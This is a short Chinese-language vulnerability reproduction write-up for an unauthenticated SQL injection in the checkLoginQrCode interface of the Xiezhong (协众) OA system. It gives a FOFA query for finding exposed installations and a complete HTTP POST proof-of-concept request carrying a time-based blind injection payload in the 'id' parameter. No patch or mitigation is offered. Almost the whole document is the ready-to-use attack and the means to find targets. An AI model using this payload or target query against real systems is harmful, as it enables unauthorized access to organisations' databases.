# 协众OA系统接口checkLoginQrCode存在SQL注入漏洞复现

协众OA checkLoginQrCode 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
app="协众软件-协众OA"
```

## poc
```javascript
POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Priority: u=0, i
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0

id=(select * from (select sleep(5))z)
```

![image-20241219150543058](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191505120.png)